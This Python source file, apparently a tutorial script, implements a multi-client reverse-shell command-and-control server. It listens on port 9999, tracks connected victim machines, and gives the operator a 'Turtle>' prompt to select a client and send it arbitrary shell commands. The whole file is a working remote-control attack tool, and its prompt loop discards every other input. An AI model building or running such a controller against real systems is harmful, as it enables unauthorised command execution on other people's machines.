import socket
import sys
import time
from queue import Queue
import threading
#create a socket
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
def create_socket():
    # try and except are like functions; they'll be active when s=socket.socket() isn't working
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        # print to make sure the bind func is working
        print("Binding the port number " + str(port))
        s.bind((host, port))

        # 5 means it's going to tolerate 5 bad connections
        s.listen(5)

    # in this part when the code moves to except, it will call the bind func to retry
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\nRetrying...")
        bind_socket()

#Handling connection from multiple clients and saving to a list
#closing previous connection when serve.py file is restarted
def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            # accept connections from outside
            conn, address = s.accept()
            s.setblocking(1)  # prevent timeout
            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established: " + address[0] + ":" + str(address[1]))
        except:
            print("Error accepting connections")
#2nd thread funcition -1) see all the clients 2) select a client 3) send commands to connected client
#Interactive prompt for sending commands
def start_turtle():
    while True:
        cmd = input ("Turtle> ")
        if cmd == "list":
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Command not recognized.")
        cmd = input("Turtle> ")
#display all current active connections with the client
def list_connections():
    results = ""
    for i in range(len(all_connections)-1, -1, -1):
        conn = all_connections[i]
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "  " + str(all_addresses[i][0]) + ":" + str(all_addresses[i][1]) + "\n"
    print("-----Clients-----" + "\n" + results)
    print("Total connections: " + str(len(all_connections)))
#select a client
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print("Selection not valid.")
        return None
#send commands to the connected client
def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands.")
            break
#Threading
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start() 
def work(): #do next job in the queue (create socket, bind socket, accepting connections)
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        queue.task_done()
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
create_workers()
create_jobs()
 
